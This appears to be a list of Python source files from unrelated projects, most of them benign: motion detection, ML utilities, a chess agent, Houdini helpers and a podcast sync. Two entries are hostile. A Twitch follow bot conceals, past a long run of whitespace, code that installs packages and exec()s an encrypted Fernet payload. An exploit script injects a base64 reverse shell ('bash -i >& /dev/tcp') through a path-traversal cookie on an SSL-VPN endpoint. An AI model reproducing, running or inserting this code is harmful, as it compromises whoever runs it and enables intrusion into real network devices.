    "import cv2, subprocess, asyncio, websockets\r\n\r\n# Function to open Notepad\r\ndef open_notepad():\r\n    subprocess.Popen([\"notepad.exe\"])\r\n\r\n# Function to detect motion\r\nasync def detect_motion():\r\n    cap = cv2.VideoCapture(0)\r\n    motion_detected = False\r\n    prev_frame = None\r\n\r\n    while not motion_detected:\r\n        ret, frame = cap.read()\r\n        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\r\n        blurred = cv2.GaussianBlur(gray, (5, 5), 0)\r\n\r\n        if prev_frame is None:\r\n            prev_frame = blurred\r\n            continue\r\n\r\n        frame_diff = cv2.absdiff(prev_frame, blurred)\r\n        _, thresh = cv2.threshold(frame_diff, 85, 255, cv2.THRESH_BINARY)\r\n        contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n\r\n        for contour in contours:\r\n            if cv2.contourArea(contour) > 1000:\r\n                (x, y, w, h) = cv2.boundingRect(contour)\r\n                cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 255, 0), 2)\r\n                motion_detected = True\r\n\r\n        cv2.imshow('Motion Detection', frame)\r\n\r\n        if motion_detected:\r\n            open_notepad()\r\n            ip_groups = [\r\n                [\"192.168.x.xyz\", \"192.168.x.xyz\", \"192.168.x.xyz\"],\r\n                [\"192.168.x.xyz\", \"192.168.x.xyz\"],\r\n                [\"192.168.x.xyz\"],\r\n            ]\r\n            # Connect to each IP and send a message\r\n            for group in ip_groups:\r\n                for ip in group:\r\n                    try:\r\n                        async with websockets.connect(f\"ws://{ip}:35369\") as websocket:\r\n                            await websocket.send(\"Motion detected\")\r\n                            print(f\"Sent 'Motion detected' to {ip}\")\r\n                    except asyncio.TimeoutError:\r\n                        print(f\"Timeout connecting to {ip}. Moving to the next IP.\")\r\n                        continue\r\n                await asyncio.sleep(3)\r\n\r\n        prev_frame = blurred\r\n        if cv2.waitKey(1) & 0xFF == ord('q'):\r\n            break\r\n\r\n    cap.release()\r\n    cv2.destroyAllWindows()\r\n\r\n# Function to start the WebSocket server\r\nasync def start_ws_server():\r\n    async def ws_server(websocket, path):\r\n        print(\"WebSocket server started.\")\r\n        try:\r\n            async for message in websocket:\r\n                print(f\"Received message: {message}\")\r\n        except websockets.ConnectionClosedError:\r\n            print(\"Connection closed.\")\r\n\r\n    # Start the WebSocket server\r\n    start_server = websockets.serve(ws_server, \"192.168.x.xyz\", 35369)\r\n    await start_server\r\n\r\n# Main function\r\nasync def main():\r\n    # Start the WebSocket server\r\n    await start_ws_server()\r\n\r\n    # Start motion detection\r\n    await detect_motion()\r\n\r\n# Run the main function\r\nasyncio.run(main())\r\n",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vFB4zKkklOfZvTB-oy9RdNjWPnPJnYzFH_VFPrVtHy0=').decrypt(b'gAAAAABmGp4v0RgXPr5uA5S9j5Hf5JUFNnNrqpzeaPLWLsp7PHG29gmQFZE5Z7K4C5JEc01gM_6647UPi1Urx3hs4Qs4q5e_AEXY3UHzu54_9tt-9WLX34ep-PtO3pCV4arfeYCpsMOH_UWeGzU0vQ1xnq9-b93_rS6XZByWEKnbsxK5EwbxsMBIwzz9dMAjta_vQnLtrkqDkJF33vE-wC_VUcba0EfhZe3UUmY7bP7a2wSquiP9j3Y='))\nimport os\nimport requests\nimport threading\n\nfrom itertools import cycle\nfrom colorama import Fore, init\n\n\ninit(convert=True)\n\n\nclass stats():\n    sent = 0\n    error = 0\n\n\n\ndef get_username(channel_name):\n\n    json = {\"operationName\": \"ChannelShell\",\n            \"variables\": {\n                \"login\": channel_name\n            },\n            \"extensions\": {\n                \"persistedQuery\": {\n                    \"version\": 1,\n                    \"sha256Hash\": \"580ab410bcd0c1ad194224957ae2241e5d252b2c5173d8e0cce9d32d5bb14efe\"\n                }\n            }\n        }\n\n    headers = {\n        'Client-ID': 'kimne78kx3ncx6brgo4mv6wki5h1ko'\n    }\n    r = requests.post('https://gql.twitch.tv/gql', json=json, headers=headers)\n    return r.json()['data']['userOrError']['id']\n\n\nclass Choose_Cookie():\n\n    def get_token():\n        with open('tokens.txt', 'r') as f:\n            tokens = [line.strip('\\n') for line in f]\n        return tokens\n    cookie = get_token()\n    tokens_loop = cycle(cookie)\n\n\n\n\nsem = threading.Semaphore(200)\n\n\nchannel_name = input(\"Enter channel name > \")\n\nclass Twitch():\n\n    def follow():\n        with sem:\n            os.system(f'title Success: {stats.sent} ^| Error: {stats.error}')\n            channel_ID = get_username(channel_name)\n\n            token = next(Choose_Cookie.tokens_loop)\n\n            headers = {\n                'Accept': '*/*',\n                'Accept-Language': 'en-GB',\n                'Authorization': f'OAuth {token}',\n                'Client-Id': 'kimne78kx3ncx6brgo4mv6wki5h1ko',\n                'Connection': 'keep-alive',\n                'Content-Type': 'text/plain;charset=UTF-8',\n                'Origin': 'https://www.twitch.tv',\n                'Referer': 'https://www.twitch.tv/',\n                'Sec-Fetch-Dest': 'empty',\n                'Sec-Fetch-Mode': 'cors',\n                'Sec-Fetch-Site': 'same-site',\n                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',\n                'sec-ch-ua': '\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"',\n                'sec-ch-ua-mobile': '?0',\n                'sec-ch-ua-platform': '\"Windows\"',\n                }\n            \n            data = '[{\"operationName\":\"FollowButton_FollowUser\",\"variables\":{\"input\":{\"disableNotifications\":false,\"targetID\":\"'+channel_ID+'\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"800e7346bdf7e5278a3c1d3f21b2b56e2639928f86815677a7126b093b2fdd08\"}}}]'\n            r = requests.post('https://gql.twitch.tv/gql', headers=headers, data=data)\n            if r.status_code == 200:\n                stats.sent += 1\n        ",
    "from solver.description import *\nfrom solver.stmt import *\nfrom solver.layout import *\n\nclass TileLoopBuilder:\n    def build(self, loopdesc, body_stmt):\n        assert(isinstance(loopdesc, FusedTileLoopDesc))\n        assert(isinstance(body_stmt, StmtInterface))\n        boundstmt = BinaryExpr(IdExpr(loopdesc.looprange), IdExpr(loopdesc.startpoint), '+')\n        if loopdesc.extra_uppbd != None:\n            boundlist = []\n            boundlist.append(IdExpr(loopdesc.extra_uppbd))\n            boundlist.append(BinaryExpr(IdExpr(loopdesc.looprange), IdExpr(loopdesc.startpoint), '+'))\n            boundstmt = FuncCallStmt('min', boundlist)\n\n        startstmt = IdExpr(loopdesc.startpoint)\n        if loopdesc.parallelism>1:\n            startstmt = IdExpr(loopdesc.startpoint + '+'+ loopdesc.tid_start_pt + '*' + str(loopdesc.tile_sz)  )\n        tilestmt = IdExpr(loopdesc.tile_sz)\n        if loopdesc.parallelism>1:\n            tilestmt = IdExpr(str(loopdesc.tile_sz) + '*' + str(loopdesc.parallelism))\n        loopstmt = LoopStmt(loopdesc.fused_id, loopdesc.lv, startstmt , boundstmt, tilestmt, body_stmt)\n        return loopstmt\n    \n\nclass TileGroupBuilder:\n    def build(self, groupdesc, body_stmt):\n        loopdesc_list = groupdesc.fuse_tileloop_list\n        loopbuilder = TileLoopBuilder()\n        dyn_body = body_stmt\n        for lpd in loopdesc_list:\n            dyn_body = loopbuilder.build(lpd, dyn_body)\n        return dyn_body\n\nclass LoopNestBuilder:\n    def build(self, groupdesc_list, compute_stmt):\n        dyn_body = compute_stmt\n        groupbuilder = TileGroupBuilder()\n        for gdesc in groupdesc_list:\n            dyn_body = groupbuilder.build(gdesc, dyn_body)\n        return dyn_body\n\n\nclass OutPdUkrCallBuilder:\n    def build(self, ukrdesc):\n        inA = BinaryExpr(IdExpr(ukrdesc.A), IdExpr(ukrdesc.Aoff), '+')\n        inB = BinaryExpr(IdExpr(ukrdesc.B), IdExpr(ukrdesc.Boff), '+')\n        inC = CinaryExpr(IdExpr(ukrdesc.C), IdExpr(ukrdesc.Coff), '+')\n        \n        arglist = [inA, inB, inC , IdExpr(ukrdesc.bcast_off)]\n        return FuncCallStmt(ukrdesc.name, arglist)\n\n\n        \n\nclass CnnBranchBuilder:\n    def build(self, img_tile, f_tile, id_x, id_y, id_xy, N_x, N_y, N_h, arg_list, func_name_list, c_fast_seg, strideXY=[1,1]):\n        # assume img_y is fast access\n        # assume prepadding\n        cond_expr_list = []\n        body_stmt_list = []\n\n        assert(len(func_name_list)>=3)\n\n        call_arg_list = []\n        for arg_name in arg_list:\n            call_arg_list.append(IdExpr(arg_name))\n        \n        y_y1 = BinaryExpr(IdExpr(N_y), IdExpr(id_y),'-')\n        cond_expr_list.append( BinaryExpr(y_y1, IdExpr(img_tile), '>='))\n        body_stmt_list.append(NormalStmt(FuncCallStmt(func_name_list[0], call_arg_list)))\n        \n        xy_xy1 = BinaryExpr(BinaryExpr(IdExpr(N_x), IdExpr(N_y), '*'), IdExpr(id_xy)  ,  '-' )\n        cond_expr_list.append(BinaryExpr(xy_xy1, IdExpr(img_tile), '>='))\n        ukr2 = NormalStmt(FuncCallStmt(func_name_list[1], call_arg_list))\n        body_stmt_list.append(EdgeY_Body_Builder().\n                              build(N_y, id_y, img_tile, arg_list[-1], (N_h-1)*c_fast_seg + (strideXY[1]-1)*(strideXY[1]*N_y+N_h-1)*c_fast_seg, ukr2))\n\n        \n\n        default_stmt = NormalStmt(FuncCallStmt(func_name_list[2], call_arg_list))\n        return BranchStmt(cond_expr_list, body_stmt_list, default_stmt)\n    \n        \nclass TensorOffsetStmtBuilder:\n    def build(self, offsetname,  tensor, var_list, strideXY=[1,1]):\n        assert (len(var_list) == len(tensor.idseg_permu))\n\n        binary_list = []\n#        print(var_list)\n#        print(tensor.stride)\n        for var, stride in zip(var_list, tensor.stride):\n            for v in var:\n                if 'offsetA' in offsetname:\n                    if 'x' in v:\n                        binary_list.append(BinaryExpr(IdExpr(str(strideXY[0])+'*'+v), IdExpr(stride), '*'))\n                    elif  'y' in v:\n                        binary_list.append(BinaryExpr(IdExpr(str(strideXY[1])+'*'+v), IdExpr(stride), '*'))\n                    else:\n                        binary_list.append(BinaryExpr(IdExpr(v), IdExpr(stride), '*'))\n                else:\n                    binary_list.append(BinaryExpr(IdExpr(v), IdExpr(stride), '*'))\n\n        offset_expr = IdExpr(0)\n\n        for binexpr in binary_list:\n            offset_expr = BinaryExpr(offset_expr, binexpr, '+')\n\n        offset_expr = BinaryExpr(IdExpr(offsetname), offset_expr, '=')\n\n        return NormalStmt(offset_expr)\n        \n        \nclass RecoverOrigIdxBuilder:\n    def build(self, IdxSplit):\n        cnt = 0\n        stmt_list = []\n        for idx, strd in zip(IdxSplit.orig_id_list, IdxSplit.orig_strides):\n            if cnt > 0:\n                prev_strd = IdxSplit.orig_strides[cnt-1]\n                tmpexpr = BinaryExpr(IdExpr(IdxSplit.fuse_id), IdExpr(prev_strd), '%')\n                tmpexpr = BinaryExpr(tmpexpr, IdExpr(strd), '/')\n            else:\n                tmpexpr = BinaryExpr(I",
    "from typing import Any, List, Optional, Tuple\n\nimport torch\nimport torch.nn as nn\nfrom pytorch_lightning.callbacks import Callback\nimport pytorch_lightning as pl\n\n\nclass VerifyFrozenParameters(Callback):\n    \"\"\"This callback checks at the end of each training batch that the weights\n    of the layers that are not supposed to be updated, really were not updated.\n    This can help as a sanity check to identify bugs.\n    \"\"\"\n    \n    def __init__(\n        self,\n        **kwargs\n    ):\n        \"\"\"Init function of class VerifyFrozenParameters.\n        \n        NOTE: You can get the name parameters of a layer by calling named_parameters()\n        on it.\n\n        Args:\n            non_frozen_parameters (List[Tuple[str, nn.parameter.Parameter]]): The\n                named parameters that are supposed to be not frozen.\n            frozen_parameters (List[Tuple[str, nn.parameter.Parameter]]): The named\n                parameters that are supposed to be frozen.\n        \"\"\"\n        super().__init__()\n\n    def on_after_backward(\n        self,\n        trainer: \"pl.Trainer\",\n        pl_module: \"pl.LightningModule\"\n    ) -> None:\n        for name, param in pl_module._params_to_optimize:\n            assert param.requires_grad == True, f'Parameter {name} is supposed '\\\n                'to be unfrozen but has `requires_grad` set to False.'\n            assert param.grad is not None, f'Parameter {name} did not receive a '\\\n                'gradient but was supposed to (should be unfrozen).'\n            if param.grad is not None:\n                temp = torch.zeros(param.grad.shape)\n                temp[param.grad != 0] += 1\n                result = torch.any(temp != 0).cpu().numpy()\n                assert result != 0, 'Gradients did not change for some unfrozen parameters.'\n        for name, param in self._frozen_parameters:\n            assert param.requires_grad == False, f'Parameter {name} is supposed '\\\n                'to be frozen but has `requires_grad` set to True.'\n            assert param.grad is None, f'Parameter {name} received a '\\\n                'gradient but was not supposed to (should be frozen).'\n",
    "from transformers import T5Tokenizer, T5ForConditionalGeneration\nfrom mh_agent import MHAgent\nfrom mh_chess import MHChess\nimport torch\n\nclass MHFLANT5(MHAgent):\n    def __init__(self, model_name='google/flan-t5-base', color='white'):\n        self.device = 'cuda' if torch.cuda.is_available() else 'cpu'\n        self.model_name = model_name\n        self.model = T5ForConditionalGeneration.from_pretrained(model_name, device_map='auto')\n        self.tokenizer = T5Tokenizer.from_pretrained(model_name)\n        self.name = self.getname()\n        self.color = color\n\n    def getname(self):\n        return self.model_name.split('/')[-1]\n\n    def makeMove(self, board):\n        prompt = self.generatePrompt(board)\n        ans = self.generateResponse(prompt)\n        ##  Validate the move...\n        legal_moves = board.getLegalMoves()\n        for move in legal_moves:\n            if move in ans:\n                return move, ans\n        return None, ans\n\n\n    def generateResponse(self, input_text):\n        input_ids = self.tokenizer(input_text, return_tensors=\"pt\").input_ids.to(self.device)\n        res_ids = self.model.generate(input_ids, max_length=1000)\n        ans = self.tokenizer.decode(res_ids[0], skip_special_tokens=True, clean_up_tokenization_spaces=True)\n        return ans\n\n    def generatePrompt(self, board):\n        template = '{system_message}. {message}'\n        system_message = f\"You are a professional chess player. You are playing a game of chess as {self.color}. P, N, B, R, Q and K represent white pieces. p, n, b, r, q and k represent black pieces. It's your turn to make a move. You will get a list of legal moves you can make. You should choose one of them. You should only output the UCI notation of the move you want to make with no additional text.\"\n        message = \"Here's the current board state:\\n\\n\" + str(board) + \"\\n\\n\"\n        message += \"Here's a list of possible moves:\\n- \"\n        message += \"\\n- \".join(board.getLegalMoves()) + \"\\n\\n\"\n        message += \"Please make a move by choosing one of the above options. You should only output the UCI notation of the move you want to make with no additional text.\"\n        return template.format(system_message=system_message, message=message)\n\n\nif __name__ == \"__main__\":\n    mh_flant5 = MHFLANT5()\n    board = MHChess()\n    for i in range(10):\n        move, ans = mh_flant5.makeMove(board)\n        print(move, ans)\n        board.makeMove(move)\n    ",
    "from flask import Flask, render_template, send_from_directory, abort, request, redirect, Response\nfrom werkzeug.utils import secure_filename\nimport hashlib\nimport os\n\nfrom config import log_paths\n\napp = Flask(__name__)\n\npassword = os.getenv('LOGS_VIEWER_PASSWORD', 'ABCDE')\nr_url = os.getenv('LOGS_VIEWER_REDIRECT', 'https://edm115.dev')\nport = int(os.getenv('LOGS_VIEWER_PORT', 10000))\nhashed_password = hashlib.sha256(password.encode()).hexdigest()\n\n@app.route('/')\ndef index():\n    return render_template('index.html', hashed_password=hashed_password, redirect_url=r_url)\n\n@app.route('/admin')\ndef admin():\n    log_files = {}\n    client_pass = request.args.get('passwd', '')\n    if client_pass == password:\n        for bot, path in log_paths.items():\n            if os.path.exists(path):\n                files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]\n                log_files[bot] = files\n        return render_template('admin.html', log_files=log_files, hashed_password=hashed_password)\n    else:\n        return redirect(r_url)\n\n@app.route('/logs/<bot>/<filename>')\ndef log_file(bot, filename):\n    dl = request.args.get('dl', '')\n    if bot in log_paths and os.path.exists(log_paths[bot]):\n        secure_path = os.path.join(log_paths[bot], secure_filename(filename))\n        try:\n            if dl == '1':\n                return send_from_directory(log_paths[bot], filename, as_attachment=False)\n            else:\n                with open(secure_path, 'r') as f:\n                    content = f.read()\n                return Response(content, mimetype='text/plain')\n        except FileNotFoundError:\n            abort(404)\n    else:\n        return redirect(r_url)\n\nif __name__ == '__main__':\n    app.run(debug=False, port=port)\n",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom typing import Optional, Tuple\nfrom transformers import AutoConfig\n\n# Copied from transformers.models.llama.modeling_llama.repeat_kv\ndef repeat_kv(hidden_states: torch.Tensor, n_rep: int) -> torch.Tensor:\n    \"\"\"\n    This is the equivalent of torch.repeat_interleave(x, dim=1, repeats=n_rep). The hidden states go from (batch,\n    num_key_value_heads, seqlen, head_dim) to (batch, num_attention_heads, seqlen, head_dim)\n    \"\"\"\n    batch, num_key_value_heads, slen, head_dim = hidden_states.shape\n    if n_rep == 1:\n        return hidden_states\n    hidden_states = hidden_states[:, :, None, :, :].expand(batch, num_key_value_heads, n_rep, slen, head_dim)\n    return hidden_states.reshape(batch, num_key_value_heads * n_rep, slen, head_dim)\n\nclass InfiniAttention(nn.Module):\n    def __init__(self, config: AutoConfig, layer_idx: Optional[int] = None):\n        super().__init__()\n        self.config = config\n        self.layer_idx = layer_idx\n        self.hidden_size = config.hidden_size\n        self.num_heads = config.num_attention_heads\n        self.head_dim = self.hidden_size // self.num_heads\n        self.num_key_value_heads = config.num_key_value_heads\n        self.num_key_value_groups = self.num_heads // self.num_key_value_heads\n        self.max_position_embeddings = config.max_position_embeddings\n        self.rope_theta = config.rope_theta\n        self.is_causal = True\n        self.attention_dropout = config.attention_dropout\n\n        if (self.head_dim * self.num_heads) != self.hidden_size:\n            raise ValueError(\n                f\"hidden_size must be divisible by num_heads (got `hidden_size`: {self.hidden_size}\"\n                f\" and `num_heads`: {self.num_heads}).\"\n            )\n        self.q_proj = nn.Linear(self.hidden_size, self.num_heads * self.head_dim, bias=True)\n        self.k_proj = nn.Linear(self.hidden_size, self.num_key_value_heads * self.head_dim, bias=True)\n        self.v_proj = nn.Linear(self.hidden_size, self.num_key_value_heads * self.head_dim, bias=True)\n        self.o_proj = nn.Linear(self.num_heads * self.head_dim, self.hidden_size, bias=False)\n\n        self.rotary_emb = RotaryEmbedding(\n            self.head_dim,\n            max_position_embeddings=self.max_position_embeddings,\n            base=self.rope_theta,\n        )\n\n        self.beta = nn.Parameter(torch.randn(1))\n        self.register_buffer(\"M\", torch.zeros(self.num_heads, self.head_dim, self.head_dim))\n        self.register_buffer(\"z\", torch.zeros(self.num_heads, self.head_dim))\n        self.segment_size = 2048\n\n    def forward(\n        self,\n        hidden_states: torch.Tensor,\n        attention_mask: Optional[torch.Tensor] = None,\n        position_ids: Optional[torch.LongTensor] = None,\n        past_key_value: Optional[Cache] = None,\n        output_attentions: bool = False,\n        use_cache: bool = False,\n        **kwargs,\n    ) -> Tuple[torch.Tensor, Optional[torch.Tensor], Optional[Tuple[torch.Tensor]]]:\n        \n\n        bsz, q_len, _ = hidden_states.size()\n\n        query_states = self.q_proj(hidden_states)\n        key_states = self.k_proj(hidden_states)\n        value_states = self.v_proj(hidden_states)\n\n        query_states = query_states.view(bsz, q_len, self.num_heads, self.head_dim).transpose(1, 2)\n        key_states = key_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim).transpose(1, 2)\n        value_states = value_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim).transpose(1, 2)\n\n        kv_seq_len = key_states.shape[-2]\n        if past_key_value is not None:\n            kv_seq_len += past_key_value.get_usable_length(kv_seq_len, self.layer_idx)\n        cos, sin = self.rotary_emb(value_states, seq_len=kv_seq_len)\n\n        query_states, key_states = apply_rotary_pos_emb(query_states, key_states, cos, sin, position_ids)\n\n        if past_key_value is not None:\n            cache_kwargs = {\"sin\": sin, \"cos\": cos}  # Specific to RoPE models\n            key_states, value_states = past_key_value.update(key_states, value_states, self.layer_idx, cache_kwargs)\n\n\n        if attention_mask is not None:\n            if attention_mask.size() != (bsz, 1, q_len, kv_seq_len):\n                raise ValueError(\n                    f\"Attention mask should be of size {(bsz, 1, q_len, kv_seq_len)}, but is {attention_mask.size()}\"\n                )\n\n\n        # GQA\n        # Memory retrieval and attention calculation per segment\n        memory_output = self._retrieve_from_memory(query_states, self.M, self.z)\n        # Update memory with current segment's key and value states\n        self.M, self.z  = self._update_memory(key_states, value_states, self.M, self.z)\n        key_states = repeat_kv(key_states, self.num_key_value_groups)\n        value_states = repeat_kv(value_states, self.num_key_value_groups)\n\n        causal_mask = attention_mask\n\n        attn_output = torch.nn.functional.scaled_dot_product_attention(\n            query_states,\n    ",
    "import hou\n\ndef default(var, default):\n    \"\"\" Sentinel default value. returns default if the variable is None \"\"\"\n    return default if var is None else var\n\ndef default_hda_color(node):\n    color = hou.Color((1, .9, .8)) #peachy yellow\n    node.setColor(color)\n\ndef attwrangle_color(sel=None, colors=None, rainbow=None, keepcolor=None, comment=None):\n    \"\"\"\n    Change color of attribute wrangle SOPs according to the Run class. 'colors':list of vector RGB. 'rainbow', 'keepcolor', 'comment': boolean.\n    \"\"\"\n    sel = default(sel, hou.selectedNodes())\n    if len(sel) == 0: #Apply to all if nothing is selected\n        sel = hou.node(\"/obj/\").allSubChildren()\n    colors = default(colors, [(.55, .45, .3), (.765, 1, .576), (0.48, 0.75, 1), (0.75, 0.55, 0.95), (0.354, 0.304, 0.354)])\n    rainbow = default(rainbow, 0)\n    keepcolor = default(keepcolor, 1)\n    comment = default(comment, 0)\n\n    if comment is None:\n        comment = 0    \n    for node in sel:        \n        if isinstance(node, hou.SopNode) and node.type().name() == \"attribwrangle\" :            \n            runon = node.parm(\"class\").eval()            \n            if node.isEditableInsideLockedHDA() :\n                if ((node.color() == hou.Color((.8, .8, .8)) or node.color() == hou.Color((.839, .839, .839)) ) if keepcolor else 1) :\n                    if rainbow:    \n                        color = hou.Color((0,1,1))\n                        color.setHSV((runon/5.0*290+0,.6,.9))\n                    else:                    \n                        color = hou.Color(colors[runon])\n                    node.setColor(color)\n\n                # Comment\n                if comment:\n                    firstline = node.parm(\"snippet\").eval().split(\"\\n\")[0]\n                    if \"//\" in firstline or \"/*\" in firstline:\n                        comment = node.comment()                    \n                        firstline = firstline.replace(\"//\", \"\").replace(\"/*\", \"\").lstrip()\n                        if firstline not in comment:\n                            comment = comment if comment == \"\" else comment + \"\\n\" \n                            node.setComment(comment + firstline)\n                            node.setGenericFlag(hou.nodeFlag.DisplayComment,True)\n\ndef delete_parm_channels(sel=None, revert_defaults=None):\n    \"\"\"\n    Delete nodes's parameter channels. Animation, etc,\n    \"\"\"\n    sel = default(sel, hou.selectedNodes())\n    revert_defaults = default(revert_defaults, 0)\n    \n    for node in sel:\n        parms = node.parms()\n        for parm in parms:\n            parm.deleteAllKeyframes()\n            if revert_defaults:\n                parm.revertToDefaults()\n",
    "import subprocess\nimport base64\n\ndef generate_reverse_shell(lhost, lport):\n    reverse_shell_command = f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\n    encoded_reverse_shell = base64.b64encode(reverse_shell_command.encode()).decode()\n    return encoded_reverse_shell\n\ndef generate_curl_command(IP, encoded_reverse_shell):\n    curl_command = (\n        f\"curl -s -X POST 'https://{IP}/ssl-vpn/hipreport.esp' -k \"\n        f\"-H 'Cookie: SESSID=/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${{IFS}}{encoded_reverse_shell}|base64${{IFS}}-d|bash`'\"\n    )\n\n    return curl_command\n\nIP = input(\"Enter the vulnerable target IP/Host: \")\nlhost = input(\"Enter the IP/Host for reverse shell: \")\nlport = input(\"Enter the port for reverse shell: \")\n\nencoded_reverse_shell = generate_reverse_shell(lhost, lport)\n\ncurl_command = generate_curl_command(IP, encoded_reverse_shell)\n\ntry:\n    subprocess.run(curl_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    print(\"Reverse shell successfully launched. Please wait.\")\nexcept subprocess.CalledProcessError:\n    print(\"Error occurred while launching reverse shell.\")\n",
    "import argparse\nimport json\nimport os\nimport pendulum\nfrom retrying import retry\nimport requests\nfrom notion_helper import NotionHelper\nimport utils\nfrom dotenv import load_dotenv\n\nload_dotenv()\nDOUBAN_API_HOST = os.getenv(\"DOUBAN_API_HOST\", \"frodo.douban.com\")\nDOUBAN_API_KEY = os.getenv(\"DOUBAN_API_KEY\", \"0ac44ae016490db2204ce0a042db2916\")\n\nfrom config import (\n    movie_properties_type_dict,\n    book_properties_type_dict,\n    TAG_ICON_URL,\n)\nfrom utils import get_icon\n\n\nheaders = {\n    \"host\": \"api.xiaoyuzhoufm.com\",\n    \"applicationid\": \"app.podcast.cosmos\",\n    \"x-jike-refresh-token\": os.getenv(\"REFRESH_TOKEN\"),\n    \"x-jike-device-id\": \"5070e349-ba04-4c7b-a32e-13eb0fed01e7\",\n}\n\n\n@retry(stop_max_attempt_number=3, wait_fixed=5000)\ndef refresh_token():\n    url = \"https://api.xiaoyuzhoufm.com/app_auth_tokens.refresh\"\n    resp = requests.post(url, headers=headers)\n    if resp.ok:\n        token = resp.json().get(\"x-jike-access-token\")\n        headers[\"x-jike-access-token\"] = token\n\n\n@retry(stop_max_attempt_number=3, wait_fixed=5000)\ndef get_podcast():\n    results = []\n    url = \"https://api.xiaoyuzhoufm.com/v1/subscription/list\"\n    data = {\n        \"limit\": 25,\n        \"sortBy\": \"subscribedAt\",\n        \"sortOrder\": \"desc\",\n    }\n    loadMoreKey = \"\"\n    while loadMoreKey is not None:\n        if loadMoreKey:\n            data[\"loadMoreKey\"] = loadMoreKey\n        resp = requests.post(url, json=data, headers=headers)\n        if resp.ok:\n            loadMoreKey = resp.json().get(\"loadMoreKey\")\n            results.extend(resp.json().get(\"data\"))\n        else:\n            refresh_token()\n            raise Exception(f\"Error {data} {resp.text}\")\n    return results\n\n\n@retry(stop_max_attempt_number=3, wait_fixed=5000)\ndef get_mileage():\n    results = []\n    url = \"https://api.xiaoyuzhoufm.com/v1/mileage/list\"\n    data = {\"rank\": \"TOTAL\"}\n    loadMoreKey = \"\"\n    while loadMoreKey is not None:\n        if loadMoreKey:\n            data[\"loadMoreKey\"] = loadMoreKey\n        resp = requests.post(url, json=data, headers=headers)\n        if resp.ok:\n            loadMoreKey = resp.json().get(\"loadMoreKey\")\n            for item in resp.json().get(\"data\"):\n                podcast = item.get(\"podcast\")\n                podcast[\"playedSeconds\"] = item.get(\"playedSeconds\", 0)\n                results.append(podcast)\n        else:\n            refresh_token()\n            raise Exception(f\"Error {data} {resp.text}\")\n    return results\n\n\n@retry(stop_max_attempt_number=3, wait_fixed=5000)\ndef get_episode(pid, timestamp):\n    results = []\n    url = \"https://api.xiaoyuzhoufm.com/v1/episode/list\"\n    data = {\n        \"limit\": 25,\n        \"pid\": pid,\n    }\n    loadMoreKey = \"\"\n    while loadMoreKey is not None:\n        if loadMoreKey:\n            data[\"loadMoreKey\"] = loadMoreKey\n        resp = requests.post(url, json=data, headers=headers)\n        if resp.ok:\n            loadMoreKey = resp.json().get(\"loadMoreKey\")\n            d = resp.json().get(\"data\")\n            for item in d:\n                pubDate = pendulum.parse(item.get(\"pubDate\")).in_tz(\"UTC\").int_timestamp\n                if pubDate <= timestamp:\n                    return results\n                item[\"pubDate\"] = pubDate\n                results.append(item)\n        else:\n            refresh_token()\n            raise Exception(f\"Error {data} {resp.text}\")\n    return results\n\n\n@retry(stop_max_attempt_number=3, wait_fixed=5000)\ndef get_history():\n    results = []\n    url = \"https://api.xiaoyuzhoufm.com/v1/episode-played/list-history\"\n    data = {\n        \"limit\": 25,\n    }\n    loadMoreKey = \"\"\n    while loadMoreKey is not None:\n        if loadMoreKey:\n            data[\"loadMoreKey\"] = loadMoreKey\n        resp = requests.post(url, json=data, headers=headers)\n        if resp.ok:\n            loadMoreKey = resp.json().get(\"loadMoreKey\")\n            d = resp.json().get(\"data\")\n            for item in d:\n                episode = item.get(\"episode\")\n                pubDate = pendulum.parse(episode.get(\"pubDate\")).in_tz(\"UTC\").int_timestamp\n                episode[\"pubDate\"] = pubDate\n                results.append(episode)\n        else:\n            refresh_token()\n            raise Exception(f\"Error {data} {resp.text}\")\n    return results\n\n\ndef check_podcast(pid):\n    \"\"\"\u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u63d2\u5165\u8fc7\"\"\"\n    filter = {\"property\": \"Pid\", \"rich_text\": {\"equals\": pid}}\n    response = notion_helper.query(\n        database_id=notion_helper.podcast_database_id, filter=filter\n    )\n    if len(response[\"results\"]) > 0:\n        return response[\"results\"][0].get(\"id\")\n\n\ndef check_eposide(eid):\n    \"\"\"\u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u63d2\u5165\u8fc7\"\"\"\n    filter = {\"property\": \"Eid\", \"rich_text\": {\"equals\": eid}}\n    response = notion_helper.query(\n        database_id=notion_helper.episode_database_id, filter=filter\n    )\n    if len(response[\"results\"]) > 0:\n        return response[\"results\"][0].get(\"id\")\n\n\ndef get_timestamp(id):\n    \"\"\"\u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u63d2\u5165\u8fc7\"\"\"\n    filter = {\"property\": \"Podcast\", \"relation\": {\"contains\": id}}\n    sorts = [\n        {\n            \"prope",
